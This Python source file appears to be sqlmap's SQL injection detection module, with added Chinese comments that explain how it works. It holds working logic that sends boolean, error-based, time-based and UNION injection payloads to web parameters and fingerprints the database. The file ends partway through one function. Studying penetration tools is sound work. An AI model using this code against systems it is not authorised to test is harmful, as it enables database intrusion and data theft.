#coding=utf-8
#!/usr/bin/env python

"""
Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import copy
import httplib
import re
import socket
import time

from subprocess import Popen as execute

from extra.beep.beep import beep
from lib.core.agent import agent
from lib.core.common import arrayizeValue
from lib.core.common import Backend
from lib.core.common import extractRegexResult
from lib.core.common import extractTextTagContent
from lib.core.common import findDynamicContent
from lib.core.common import Format
from lib.core.common import getLastRequestHTTPError
from lib.core.common import getPublicTypeMembers
from lib.core.common import getSortedInjectionTests
from lib.core.common import getUnicode
from lib.core.common import intersect
from lib.core.common import listToStrValue
from lib.core.common import parseFilePaths
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import showStaticWords
from lib.core.common import singleTimeLogMessage
from lib.core.common import singleTimeWarnMessage
from lib.core.common import urlencode
from lib.core.common import wasLastResponseDBMSError
from lib.core.common import wasLastResponseHTTPError
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.datatype import InjectionDict
from lib.core.decorators import cachedmethod
from lib.core.dicts import FROM_DUMMY_TABLE
from lib.core.enums import CUSTOM_LOGGING
from lib.core.enums import DBMS
from lib.core.enums import HEURISTIC_TEST
from lib.core.enums import HTTP_HEADER
from lib.core.enums import HTTPMETHOD
from lib.core.enums import NULLCONNECTION
from lib.core.enums import PAYLOAD
from lib.core.enums import PLACE
from lib.core.exception import SqlmapConnectionException
from lib.core.exception import SqlmapNoneDataException
from lib.core.exception import SqlmapSilentQuitException
from lib.core.exception import SqlmapUserQuitException
from lib.core.settings import FORMAT_EXCEPTION_STRINGS
from lib.core.settings import HEURISTIC_CHECK_ALPHABET
from lib.core.settings import SUHOSIN_MAX_VALUE_LENGTH
from lib.core.settings import UNKNOWN_DBMS
from lib.core.settings import LOWER_RATIO_BOUND
from lib.core.settings import UPPER_RATIO_BOUND
from lib.core.settings import IDS_WAF_CHECK_PAYLOAD
from lib.core.threads import getCurrentThreadData
from lib.request.connect import Connect as Request
from lib.request.inject import checkBooleanExpression
from lib.request.templates import getPageTemplate
from lib.techniques.union.test import unionTest
from lib.techniques.union.use import configUnion

def checkSqlInjection(place, parameter, value):
    # Store here the details about boundaries and payload used to
    # successfully inject 存储在这里,细节边界和负载用于成功注入
    injection = InjectionDict()

    # Localized thread data needed for some methods 局部线程数据所需的一些方法
    threadData = getCurrentThreadData()

    # Set the flag for SQL injection test mode 设置为SQL注入测试模式
    kb.testMode = True

    for test in getSortedInjectionTests(): #发现最终的dbms
        try:
            if kb.endDetection:
                break

            if conf.dbms is None:
                if not injection.dbms and PAYLOAD.TECHNIQUE.BOOLEAN in injection.data:#判断DBMS类型，如果用户没有手工指定dbms
                    if not Backend.getIdentifiedDbms() and not kb.heuristicDbms:
                        kb.heuristicDbms = heuristicCheckDbms(injection) or UNKNOWN_DBMS
                        #首先，如果用户没有手工指定dbms，则会根据页面报错或者bool类型的测试，找出DBMS类型，找出后，会提示是否跳过测试其他的DBMS #对于测试出来的DBMS，是否用所有的payload来测试。
                if not conf.testFilter and (Backend.getErrorParsedDBMSes() or kb.heuristicDbms) not in ([], None, UNKNOWN_DBMS):
                    if kb.reduceTests is None and Backend.getErrorParsedDBMSes():
                        msg = "heuristic (parsing) test showed that the " # 启发式(解析)测试表明,后端数据库管理系统可以 ”
                        msg += "back-end DBMS could be '%s'. " % (Format.getErrorParsedDBMSes() if Backend.getErrorParsedDBMSes() else kb.heuristicDbms)
                        msg += "Do you want to skip test payloads specific for other DBMSes? [Y/n]" #你想跳过测试载荷具体其他dbms ?[Y / n]
                        kb.reduceTests = [] if readInput(msg, default='Y').upper() != 'Y' else (Backend.getErrorParsedDBMSes() or [kb.heuristicDbms])

                    if kb.extendTests is None: 
                        _ = (Format.getErrorParsedDBMSes() if Backend.getErrorParsedDBMSes() else kb.heuristicDbms)
                        msg = "do you want to include all tests for '%s' " % _ #你想为“% s”扩展提供包括所有测试(% d)和风险水平(% s)?[Y / n]
                        msg += "extending provided level (%d) and risk (%s)? [Y/n]" % (conf.level, conf.risk)
                        kb.extendTests = [] if readInput(msg, default='Y').upper() != 'Y' else (Backend.getErrorParsedDBMSes() or [kb.heuristicDbms])

            title = test.title
            stype = test.stype
            clause = test.clause
            unionExtended = False

            if stype == PAYLOAD.TECHNIQUE.UNION: #会判断是不是union注入，这个stype就是payload文件夹下面xml文件中的stype， 如果是union，就会进入，然后配置列的数量等
                configUnion(test.request.char)

                if "[CHAR]" in title:
                    if conf.uChar is None:
                        continue
                    else:
                        title = title.replace("[CHAR]", conf.uChar)

                elif "[RANDNUM]" in title or "(NULL)" in title:
                    title = title.replace("[RANDNUM]", "random number")

                if test.request.columns == "[COLSTART]-[COLSTOP]":
                    if conf.uCols is None:
                        continue
                    else:
                        title = title.replace("[COLSTART]", str(conf.uColsStart))
                        title = title.replace("[COLSTOP]", str(conf.uColsStop))

                elif conf.uCols is not None:
                    debugMsg = "skipping test '%s' because the user " % title
                    debugMsg += "provided custom column range %s" % conf.uCols
                    logger.debug(debugMsg)
                    continue

                match = re.search(r"(\d+)-(\d+)", test.request.columns)
                if injection.data and match:
                    lower, upper = int(match.group(1)), int(match.group(2))
                    for _ in (lower, upper):
                        if _ > 1:
                            unionExtended = True
                            test.request.columns = re.sub(r"\b%d\b" % _, str(2 * _), test.request.columns)
                            title = re.sub(r"\b%d\b" % _, str(2 * _), title)
                            test.title = re.sub(r"\b%d\b" % _, str(2 * _), test.title)

            # Skip test if the user's wants to test only for a specific
            # technique 跳过测试如果用户想要测试只对特定的技术 # 就是用户提供的–technique，共有六个选项BEUSTQ
            if conf.tech and isinstance(conf.tech, list) and stype not in conf.tech:
                debugMsg = "skipping test '%s' because the user " % title
                debugMsg += "specified to test only for "
                debugMsg += "%s techniques" % " & ".join(map(lambda x: PAYLOAD.SQLINJECTION[x], conf.tech))
                logger.debug(debugMsg)
                continue

            # Skip test if it is the same SQL injection type already
            # identified by another test # 跳过测试如果是相同的SQL注入类型已经被另外一个测试
            if injection.data and stype in injection.data:
                debugMsg = "skipping test '%s' because " % title
                debugMsg += "the payload for %s has " % PAYLOAD.SQLINJECTION[stype]
                debugMsg += "already been identified"
                logger.debug(debugMsg)
                continue


            # Skip DBMS-specific test if it does not match either the
            # previously identified or the user's provided DBMS (either
            # from program switch or from parsed error message(s)) 跳过DBMS-specific测试如果它不匹配之前确认或提供用户的DBMS(无论是从解析程序开关或错误消息(s))
            if "details" in test and "dbms" in test.details:
                dbms = test.details.dbms
            else:
                dbms = None

            # Skip tests if title is not included by the given filter 跳过测试如果不包括标题的过滤器
            if conf.testFilter:
                if not any(re.search(conf.testFilter, str(item), re.I) for item in (test.title, test.vector, dbms)):
                    debugMsg = "skipping test '%s' because " % title
                    debugMsg += "its name/vector/dbms is not included by the given filter"
                    logger.debug(debugMsg)
                    continue

            elif not (kb.extendTests and intersect(dbms, kb.extendTests)):
                # Skip test if the risk is higher than the provided (or default)跳过测试提供的风险高于(或违约)
                # value
                # Parse test's <risk>
                if test.risk > conf.risk:
                    debugMsg = "skipping test '%s' because the risk (%d) " % (title, test.risk)
                    debugMsg += "is higher than the provided (%d)" % conf.risk
                    logger.debug(debugMsg)
                    continue

                # Skip test if the level is higher than the provided (or default)
                # value 跳过测试水平高于(或违约)提供价值
                # Parse test's <level>
                if test.level > conf.level:
                    debugMsg = "skipping test '%s' because the level (%d) " % (title, test.level)
                    debugMsg += "is higher than the provided (%d)" % conf.level
                    logger.debug(debugMsg) # 跳过测试' s '因为(d)水平高于提供(d)
                    continue

            if dbms is not None:
                if injection.dbms is not None and not intersect(injection.dbms, dbms):
                    debugMsg = "skipping test '%s' because " % title
                    debugMsg += "the back-end DBMS identified is "
                    debugMsg += "%s" % injection.dbms #跳过测试's'因为后端数据库管理系统识别是s
                    logger.debug(debugMsg)
                    continue

                if conf.dbms is not None and not intersect(conf.dbms.lower(), [_.lower() for _ in arrayizeValue(dbms)]):
                    debugMsg = "skipping test '%s' because " % title
                    debugMsg += "the provided DBMS is %s" % conf.dbms #跳过测试's'因为DBMS提供 s
                    logger.debug(debugMsg)
                    continue

                if kb.reduceTests and not intersect(dbms, kb.reduceTests):
                    debugMsg = "skipping test '%s' because " % title
                    debugMsg += "the parsed error message(s) showed "
                    debugMsg += "that the back-end DBMS could be "
                    debugMsg += "%s" % Format.getErrorParsedDBMSes()
                    logger.debug(debugMsg) #跳过测试's'因为解析错误消息(s)显示,后端DBMS是s
                    continue

            # Skip test if it does not match the same SQL injection clause
            # already identified by another test 跳过测试如果它不匹配相同的SQL注入条款已经被另一个测试
            clauseMatch = False

            for clauseTest in clause:
                if injection.clause is not None and clauseTest in injection.clause:
                    clauseMatch = True
                    break

            if clause != [0] and injection.clause and injection.clause != [0] and not clauseMatch:
                debugMsg = "skipping test '%s' because the clauses " % title
                debugMsg += "differs from the clause already identified" #跳过测试's '因为条款不同于条款已经确定
                logger.debug(debugMsg)
                continue

            # Skip test if the user provided custom character 跳过测试如果用户提供自定义字符
            if conf.uChar is not None and ("random number" in title or "(NULL)" in title):
                debugMsg = "skipping test '%s' because the user " % title
                debugMsg += "provided a specific character, %s" % conf.uChar
                logger.debug(debugMsg)
                continue

            infoMsg = "testing '%s'" % title
            logger.info(infoMsg)

            # Force back-end DBMS according to the current
            # test value for proper payload unescaping 后端数据库管理系统根据当前的测试值适当的载荷亚太
            Backend.forceDbms(dbms[0] if isinstance(dbms, list) else dbms)

            # Parse test's <request>
            comment = agent.getComment(test.request) if len(conf.boundaries) > 1 else None
            fstPayload = agent.cleanupPayload(test.request.payload, origValue=value) #生成payload
            #test.request.payload为’AND [RANDNUM]=[RANDNUM]'(相应payload.xml中的request值)。根据此代码，生成一个随机字符串，如fstPayload=u’AND 2876=2876’。
            # Favoring non-string specific boundaries in case of digit-like parameter values 支持non-string特定边界digit-like参数值
            if value.isdigit():
                boundaries = sorted(copy.deepcopy(conf.boundaries), key=lambda x: any(_ in (x.prefix or "") or _ in (x.suffix or "") for _ in ('"', '\'')))
            else:
                boundaries = conf.boundaries

            for boundary in boundaries: #循环遍历boundaries.xml中的boundary节点，如果boundary的level大于用户提供的level，则跳过，不检测
                injectable = False

                # Skip boundary if the level is higher than the provided (or
                # default) value
                # Parse boundary's <level>
                if boundary.level > conf.level:
                    continue

                # Skip boundary if it does not match against test's <clause>
                # Parse test's <clause> and boundary's <clause>
                clauseMatch = False

                for clauseTest in test.clause: #循环遍历test.clause(payload中的clause值
                    if clauseTest in boundary.clause: #clauseTest在boundary的clause中，则设置 clauseMatch = True，代表此条boundary可以使用
                        clauseMatch = True
                        break

                if test.clause != [0] and boundary.clause != [0] and not clauseMatch:
                    continue

                # Skip boundary if it does not match against test's <where>
                # Parse test's <where> and boundary's <where>
                whereMatch = False
                #循环匹配where(payload中的where值)，如果存在这样的where，设置whereMatch = True。如果clause和where中的一个没有匹配成功，都会结束循环，进入下一个payload的测试。
                for where in test.where:
                    if where in boundary.where:
                        whereMatch = True
                        break

                if not whereMatch:
                    continue
                #设置payload的前缀和后缀，如果用户设置了，则使用用户设置的，如果没有，则使用boundary中的
                # Parse boundary's <prefix>, <suffix> and <ptype>
                prefix = boundary.prefix if boundary.prefix else ""
                suffix = boundary.suffix if boundary.suffix else ""

                # Options --prefix/--suffix have a higher priority (if set by user)
                prefix = conf.prefix if conf.prefix is not None else prefix
                suffix = conf.suffix if conf.suffix is not None else suffix
                comment = None if conf.suffix is not None else comment

                ptype = boundary.ptype

                # If the previous injections succeeded, we know which prefix,
                # suffix and parameter type to use for further tests, no
                # need to cycle through the boundaries for the following tests
                condBound = (injection.prefix is not None and injection.suffix is not None)
                condBound &= (injection.prefix != prefix or injection.suffix != suffix)
                condType = injection.ptype is not None and injection.ptype != ptype

                if condBound or condType:
                    continue

                # For each test's <where>
                for where in test.where: #where是payload中的where值，共有三个值
                    templatePayload = None
                    vector = None

                    # Threat the parameter original value according to the
                    # test's <where> tag
                    if where == PAYLOAD.WHERE.ORIGINAL: #表示将我们的payload直接添加在值得后面[此处指的应该是检测的参数的值] 如我们写的参数是id=1，设置值为1的话，会出现1后面跟payload
                        origValue = value
                    elif where == PAYLOAD.WHERE.NEGATIVE: #表示将检测的参数的值更换为一个整数，然后将payload添加在这个整数的后面。 如我们写的参数是id=1，设置值为2的话，会出现[数字]后面跟payload
                        # Use different page template than the original
                        # one as we are changing parameters value, which
                        # will likely result in a different content
                        kb.data.setdefault("randomInt", str(randomInt(10)))
                        if conf.invalidLogical:
                            _ = int(kb.data.randomInt[:2])
                            origValue = "%s AND %s=%s" % (value, _, _ + 1)
                        elif conf.invalidBignum:
                            origValue = "%s.%s" % (kb.data.randomInt[:6], kb.data.randomInt[0])
                        else:
                            origValue = "-%s" % kb.data.randomInt[:4]
                        templatePayload = agent.payload(place, parameter, value="", newValue=origValue, where=where)
                    elif where == PAYLOAD.WHERE.REPLACE: #表示将检测的参数的值直接更换成我们的payload。 如我们写的参数是id=1，设置值为3的话，会出现值1直接被替换成了我们的payload
                        origValue = ""

                    kb.pageTemplate, kb.errorIsNone = getPageTemplate(templatePayload, place)
                    #组合前缀、后缀、payload等，生成请求的reqPayload
                    # Forge request payload by prepending with boundary's
                    # prefix and appending the boundary's suffix to the
                    # test's ' <payload><comment> ' string
                    boundPayload = agent.prefixQuery(fstPayload, prefix, where, clause)
                    boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)
                    reqPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)
                    #payload = url参数 + boundary.prefix+test.payload+boundary.suffix
                    # Perform the test's request and check whether or not the
                    # payload was successful
                    # Parse test's <response> 执行测试的要求和检查负载是否成功的解析测试<反应>
                    for method, check in test.response.items(): # 通过for循环遍历payload中的标签
                        check = agent.cleanupPayload(check, origValue=value) #cleanupPayload()函数，就是将一些值进行随机化

                        # In case of boolean-based blind SQL injection
                        if method == PAYLOAD.METHOD.COMPARISON: #bool类型盲注
                            # Generate payload used for comparison 生成负载用于比较
                            def genCmpPayload():
                                sndPayload = agent.cleanupPayload(test.response.comparison, origValue=value)

                                # Forge response payload by prepending with
                                # boundary's prefix and appending the boundary's
                                # suffix to the test's ' <payload><comment> '
                                # string 建立响应负载通过将边界的前缀和后缀附加边界的测试的<载荷> <评论>的字符串
                                boundPayload = agent.prefixQuery(sndPayload, prefix, where, clause)
                                boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)
                                cmpPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)

                                return cmpPayload

                            # Useful to set kb.matchRatio at first based on
                            # the False response content
                            kb.matchRatio = None
                            kb.negativeLogic = (where == PAYLOAD.WHERE.NEGATIVE)
                            Request.queryPage(genCmpPayload(), place, raise404=False)
                            falsePage = threadData.lastComparisonPage or ""

                            # Perform the test's True request
                            trueResult = Request.queryPage(reqPayload, place, raise404=False)
                            truePage = threadData.lastComparisonPage or ""

                            if trueResult:
                                falseResult = Request.queryPage(genCmpPayload(), place, raise404=False)

                                # Perform the test's False request
                                if not falseResult:
                                    infoMsg = "%s parameter '%s' is '%s' injectable " % (place, parameter, title)
                                    logger.info(infoMsg)

                                    injectable = True

                            if not injectable and not any((conf.string, conf.notString, conf.regexp)) and kb.pageStable:
                                trueSet = set(extractTextTagContent(truePage))
                                falseSet = set(extractTextTagContent(falsePage))
                                candidates = filter(None, (_.strip() if _.strip() in (kb.pageTemplate or "") and _.strip() not in falsePage and _.strip() not in threadData.lastComparisonHeaders else None for _ in (trueSet - falseSet)))
                                if candidates:
                                    conf.string = candidates[0]
                                    infoMsg = "%s parameter '%s' seems to be '%s' injectable (with --string=\"%s\")" % (place, parameter, title, repr(conf.string).lstrip('u').strip("'"))
                                    logger.info(infoMsg)

                                    injectable = True

                        # In case of error-based SQL injection
                        elif method == PAYLOAD.METHOD.GREP: # 基于错误的sql注入
                            # Perform the test's request and grep the response
                            # body for the test's <grep> regular expression 执行测试的要求和grep响应身体测试< grep >的正则表达式
                            try:
                                page, headers = Request.queryPage(reqPayload, place, content=True, raise404=False) #将最终的payload传递给Request.queryPage函数执行并返回最终的执行结果page
                                output = extractRegexResult(check, page, re.DOTALL | re.IGNORECASE) \
                                        or extractRegexResult(check, listToStrValue(headers.headers \
                                        if headers else None), re.DOTALL | re.IGNORECASE) \
                                        or extractRegexResult(check, threadData.lastRedirectMsg[1] \
                                        if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == \
                                        threadData.lastRequestUID else None, re.DOTALL | re.IGNORECASE)

                                if output:
                                    result = output == "1" #使用正则：:eyo:(?P<result>.*?):abh:来匹配Duplicate entry ':eyo:1:abh:1' for key 'group_key'的结果为：1

                                    if result:
                                        infoMsg = "%s parameter '%s' is '%s' injectable " % (place, parameter, title)
                                        logger.info(infoMsg)

                                        injectable = True

                            except SqlmapConnectionException, msg:
                                debugMsg = "problem occurred most likely because the "
                                debugMsg += "server hasn't recovered as expected from the "
                                debugMsg += "error-based payload used ('%s')" % msg #最有可能出现问题,因为服务器没有按预期恢复使用的偏差有效载荷
                                logger.debug(debugMsg)

                        # In case of time-based blind or stacked queries
                        # SQL injections
                        elif method == PAYLOAD.METHOD.TIME: # 基于时间的盲注
                            # Perform the test's request 重点注意Request.queryPage函数
                            trueResult = Request.queryPage(reqPayload, place, timeBasedCompare=True, raise404=False)

                            if trueResult:
                                # Confirm test's results
                                trueResult = Request.queryPage(reqPayload, place, timeBasedCompare=True, raise404=False)

                                if trueResult:
                                    infoMsg = "%s parameter '%s' is '%s' injectable " % (place, parameter, title)
                                    logger.info(infoMsg)

                                    injectable = True

                        # In case of UNION query SQL injection
                        elif method == PAYLOAD.METHOD.UNION: # 联合查询
                            # Test for UNION injection and set the sample
                            # payload as well as the vector. 测试联盟注入和设置样本有效载荷以及向量
                            # NOTE: vector is set to a tuple with 6 elements,
                            # used afterwards by Agent.forgeUnionQuery()
                            # method to forge the UNION query payload 注意:向量组与6元组元素,然后使用Agent.forgeUnionQuery()方法建立联合查询负载

                            configUnion(test.request.char, test.request.columns)

                            if not Backend.getIdentifiedDbms():
                                if kb.heuristicDbms in (None, UNKNOWN_DBMS):
                                    warnMsg = "using unescaped version of the test "
                                    warnMsg += "because of zero knowledge of the "
                                    warnMsg += "back-end DBMS. You can try to "
                                    warnMsg += "explicitly set it using option '--dbms'"
                                    singleTimeWarnMessage(warnMsg)
                                else:
                                    Backend.forceDbms(kb.heuristicDbms)

                            if unionExtended:
                                infoMsg = "automatically extending ranges "
                                infoMsg += "for UNION query injection technique tests as "
                                infoMsg += "there is at least one other (potential) "
                                infoMsg += "technique found"
                                singleTimeLogMessage(infoMsg)

                            # Test for UNION query SQL injection SQL注入的测试联合查询
                            reqPayload, vector = unionTest(comment, place, parameter, value, prefix, suffix)

                            if isinstance(reqPayload, basestring):
                                infoMsg = "%s parameter '%s' is '%s' injectable" % (place, parameter, title)
                                logger.info(infoMsg)

                                injectable = True

                                # Overwrite 'where' because it can be set
                                # by unionTest() directly 覆盖的地方,因为它可以通过设置unionTest直接()
                                where = vector[6]

                        kb.previousMethod = method

                        if conf.dummy:
                            injectable = False

                    # If the injection test was successful feed the injection
                    # object with the test's details 如果注入测试是否成功 注入对象与测试的细节
                    if injectable is True:
                        # Feed with the boundaries details only the first time a
                        # test has been successful 饲料与边界细节只有第一次测试是成功的
                        if injection.place is None or injection.parameter is None:
                            if place in (PLACE.USER_AGENT, PLACE.REFERER, PLACE.HOST):
                                injection.parameter = place
                            else:
                                injection.parameter = parameter

                            injection.place = place
                            injection.ptype = ptype
                            injection.prefix = prefix
                            injection.suffix = suffix
                            injection.clause = clause

                        # Feed with test details every time a test is successful 加上测试细节每一次测试是成功的
                        if hasattr(test, "details"):
                            for dKey, dValue in test.details.items():
                                if dKey == "dbms":
                                    injection.dbms = dValue
                                    if not isinstance(dValue, list):
                                        Backend.setDbms(dValue)
                                    else:
                                        Backend.forceDbms(dValue[0], True)
                                elif dKey == "dbms_version" and injection.dbms_version is None and not conf.testFilter:
                                    injection.dbms_version = Backend.setVersion(dValue)
                                elif dKey == "os" and injection.os is None:
                                    injection.os = Backend.setOs(dValue)

                        if vector is None and "vector" in test and test.vector is not None:
                            vector = test.vector

                        injection.data[stype] = AttribDict()
                        injection.data[stype].title = title
                        injection.data[stype].payload = agent.removePayloadDelimiters(reqPayload)
                        injection.data[stype].where = where
                        injection.data[stype].vector = vector
                        injection.data[stype].comment = comment
                        injection.data[stype].templatePayload = templatePayload
                        injection.data[stype].matchRatio = kb.matchRatio

                        injection.conf.textOnly = conf.textOnly
                        injection.conf.titles = conf.titles
                        injection.conf.string = conf.string
                        injection.conf.notString = conf.notString
                        injection.conf.regexp = conf.regexp
                        injection.conf.optimize = conf.optimize

                        if not kb.alerted:
                            if conf.beep:
                                beep()

                            if conf.alert:
                                infoMsg = "executing alerting shell command(s) ('%s')" % conf.alert
                                logger.info(infoMsg)

                                process = execute(conf.alert, shell=True)
                                process.wait()

                            kb.alerted = True

                        # There is no need to perform this test for other
                        # <where> tags 不需要执行这个测试其他<,>标记
                        break 

                if injectable is True:
                    kb.vulnHosts.add(conf.hostname)
                    break

            # Reset forced back-end DBMS value 重置迫使后端数据库管理系统的价值
            Backend.flushForcedDbms()

        except KeyboardInterrupt:
            warnMsg = "user aborted during detection phase"
            logger.warn(warnMsg)

            msg = "how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(q)uit]"
            choice = readInput(msg, default="S", checkBatch=False)

            if choice[0] in ("s", "S"):
                pass
            elif choice[0] in ("n", "N"):
                return None
            elif choice[0] in ("e", "E"):
                kb.endDetection = True
            elif choice[0] in ("q", "Q"):
                raise SqlmapUserQuitException

        finally:
            # Reset forced back-end DBMS value 重置迫使后端数据库管理系统的价值
            Backend.flushForcedDbms()

    Backend.flushForcedDbms(True)

    # Return the injection object 返回注入对象
    if injection.place is not None and injection.parameter is not None:
        if not conf.dropSetCookie and PAYLOAD.TECHNIQUE.BOOLEAN in injection.data and injection.data[PAYLOAD.TECHNIQUE.BOOLEAN].vector.startswith('OR'):
            warnMsg = "in OR boolean-based injections, please consider usage "
            warnMsg += "of switch '--drop-set-cookie' if you experience any "
            warnMsg += "problems during data retrieval"
            logger.warn(warnMsg)

        injection = checkFalsePositives(injection)
    else:
        injection = None

    if injection:
        checkSuhosinPatch(injection)

    return injection

def heuristicCheckDbms(injection):
    retVal = None

    pushValue(kb.injection)
    kb.injection = injection
    randStr1, randStr2 = randomStr(), randomStr()

    for dbms in getPublicTypeMembers(DBMS, True):
        Backend.forceDbms(dbms)

        if checkBooleanExpression("(SELECT '%s'%s)='%s'" % (randStr1, FROM_DUMMY_TABLE.get(dbms, ""), randStr1)):
            if not checkBooleanExpression("(SELECT '%s'%s)='%s'" % (randStr1, FROM_DUMMY_TABLE.get(dbms, ""), randStr2)):
                retVal = dbms
                break

    Backend.flushForcedDbms()
    kb.injection = popValue()

    if retVal:
        infoMsg = "heuristic (extended) test shows that the back-end DBMS "  # not as important as "parsing" counter-part (because of false-positives)
        infoMsg += "could be '%s' " % retVal
        logger.info(infoMsg)

    return retVal

def checkFalsePositives(injection):
    """
    Checks for false positives (only in single special cases)
    """

    retVal = injection

    if len(injection.data) == 1 and any(map(lambda x: x in injection.data, [PAYLOAD.TECHNIQUE.BOOLEAN, PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED]))\
      or len(injection.data) == 2 and all(map(lambda x: x in injection.data, [PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED])):
#      or len(injection.data) == 1 and 'Generic' in injection.data.values()[0].title and not Backend.getIdentifiedDbms():
        pushValue(kb.injection)

        infoMsg = "checking if the injection point on %s " % injection.place
        infoMsg += "parameter '%s' is a false positive" % injection.parameter
        logger.info(infoMsg)

        def _():
            return int(randomInt(2)) + 1

        kb.injection = injection

        # Simple arithmetic operations which should show basic
        # arithmetic ability of the backend if it's really injectable
        for i in xrange(1 + conf.level / 2):
            randInt1, randInt2, randInt3 = (_() for j in xrange(3))

            randInt1 = min(randInt1, randInt2, randInt3)
            randInt3 = max(randInt1, randInt2, randInt3)

            while randInt1 >= randInt2:
                randInt2 = _()

            while randInt2 >= randInt3:
                randInt3 = _()

            if not checkBooleanExpression("%d=%d" % (randInt1, randInt1)):
                retVal = None
                break

            # Just in case if DBMS hasn't properly recovered from previous delayed request
            if PAYLOAD.TECHNIQUE.BOOLEAN not in injection.data:
                checkBooleanExpression("%d=%d" % (randInt1, randInt2))

            if checkBooleanExpression("%d>%d" % (randInt1, randInt2)):
                retVal = None
                break

            elif checkBooleanExpression("%d>%d" % (randInt2, randInt3)):
                retVal = None
                break

            elif not checkBooleanExpression("%d>%d" % (randInt3, randInt1)):
                retVal = None
                break

        if retVal is None:
            warnMsg = "false positive or unexploitable injection point detected"
            logger.warn(warnMsg)

            if PAYLOAD.TECHNIQUE.BOOLEAN in injection.data:
                if all(_.__name__ != "between" for _ in kb.tamperFunctions):
                    warnMsg = "there is a possibility that the character '>' is "
                    warnMsg += "filtered by the back-end server. You can try "
                    warnMsg += "to rerun with '--tamper=between'"
                    logger.warn(warnMsg)

        kb.injection = popValue()

    return retVal

def checkSuhosinPatch(injection):
    """
    Checks for existence of Suhosin-patch (and alike) protection mechanism(s)
    """

    if injection.place == PLACE.GET:
        pushValue(kb.injection)

        kb.injection = injection
        randInt = randomInt()

        if not checkBooleanExpression("%d=%s%d" % (randInt, ' ' * SUHOSIN_MAX_VALUE_LENGTH, randInt)):
            warnMsg = "parameter length constraint "
            warnMsg += "mechanism detected (e.g. Suhosin patch). "
            warnMsg += "Potential problems in enumeration phase can be expected"
            logger.warn(warnMsg)

        kb.injection = popValue()

def heuristicCheckSqlInjection(place, parameter):
    if kb.nullConnection: 
        debugMsg = "heuristic check skipped "
        debugMsg += "because NULL connection used" #启发式检查跳过因为空连接使用
        logger.debug(debugMsg)
        return None

    if wasLastResponseDBMSError():
        debugMsg = "heuristic check skipped "
        debugMsg += "because original page content "
        debugMsg += "contains DBMS error" # 启发式跳过因为原始页面内容包含DBMS错误检查
        logger.debug(debugMsg)
        return None

    origValue = conf.paramDict[place][parameter]

    prefix = ""
    suffix = ""

    if conf.prefix or conf.suffix: #conf.prefix和conf.suffix代表用户指定的前缀和后缀
        if conf.prefix:
            prefix = conf.prefix

        if conf.suffix:
            suffix = conf.suffix

    randStr = ""
    while '\'' not in randStr: #随机选择'”', ‘\’, ‘)’, ‘(‘, ‘,’, ‘.’中的字符，选10个，并且单引号要在
        randStr = randomStr(length=10, alphabet=HEURISTIC_CHECK_ALPHABET)

    kb.heuristicMode = True

    payload = "%s%s%s" % (prefix, randStr, suffix)
    payload = agent.payload(place, parameter, newValue=payload)
    page, _ = Request.queryPage(payload, place, content=True, raise404=False)

    kb.heuristicMode = False

    parseFilePaths(page) #调用parseFilePaths进行解析，查看是否爆出绝对路径
    result = wasLastResponseDBMSError() #wasLastResponseDBMSError是判断response中是否包含了数据库的报错信息。

    infoMsg = "heuristic (basic) test shows that %s " % place
    infoMsg += "parameter '%s' might " % parameter #启发式(基本)测试表明,**参数 **的可能

    def _(page):
        return any(_ in (page or "") for _ in FORMAT_EXCEPTION_STRINGS)

    casting = _(page) and not _(kb.originalPage)

    if not casting and not result and kb.dynamicParameter and origValue.isdigit():
        randInt = int(randomInt())
        payload = "%s%s%s" % (prefix, "%d-%d" % (int(origValue) + randInt, randInt), suffix)
        payload = agent.payload(place, parameter, newValue=payload, where=PAYLOAD.WHERE.REPLACE) #生成payload
        result = Request.queryPage(payload, place, raise404=False)

        if not result:
            randStr = randomStr()
            payload = "%s%s%s" % (prefix, "%s%s" % (origValue, randStr), suffix)
            payload = agent.payload(place, parameter, newValue=payload, where=PAYLOAD.WHERE.REPLACE) #生成payload
            casting = Request.queryPage(payload, place, raise404=False)

    kb.heuristicTest = HEURISTIC_TEST.CASTED if casting else HEURISTIC_TEST.NEGATIVE if not result else HEURISTIC_TEST.POSITIVE

    if casting:
        errMsg = "possible %s casting " % ("integer" if origValue.isdigit() else "type")
        errMsg += "detected (e.g. \"$%s=intval($_REQUEST['%s'])\") " % (parameter, parameter)
        errMsg += "at the back-end web application"
        logger.error(errMsg)

        if kb.ignoreCasted is None:
            message = "do you want to skip those kind of cases (and save scanning time)? %s " % ("[Y/n]" if conf.multipleTargets else "[y/N]") #你想跳过这些类型的情况下(并保存扫描时间)?(“[Y / n]
            kb.ignoreCasted = readInput(message, default='Y' if conf.multipleTargets else 'N').upper() != 'N'

    elif result:
        infoMsg += "be injectable"
        if Backend.getErrorParsedDBMSes():
            infoMsg += " (possible DBMS: '%s')" % Format.getErrorParsedDBMSes()
        logger.info(infoMsg)

    else:
        infoMsg += "not be injectable"
        logger.warn(infoMsg)

    return kb.heuristicTest

def checkDynParam(place, parameter, value):
    """
    This function checks if the URL parameter is dynamic. If it is
    dynamic, the content of the page differs, otherwise the
    dynamicity might depend on another parameter.  #这个函数检查URL参数是动态的。如果它是动态的,页面的内容不同,否则动态性可能取决于另一个参数。
    """

    if kb.redirectChoice:
        return None

    kb.matchRatio = None
    dynResult = None
    randInt = randomInt()

    infoMsg = "testing if %s parameter '%s' is dynamic" % (place, parameter)
    logger.info(infoMsg)

    try:
        payload = agent.payload(place, parameter, value, getUnicode(randInt))
        dynResult = Request.queryPage(payload, place, raise404=False)

        if not dynResult:
            infoMsg = "confirming that %s parameter '%s' is dynamic" % (place, parameter)
            logger.info(infoMsg)

            randInt = randomInt()
            payload = agent.payload(place, parameter, value, getUnicode(randInt))
            dynResult = Request.queryPage(payload, place, raise404=False)
    except SqlmapConnectionException:
        pass

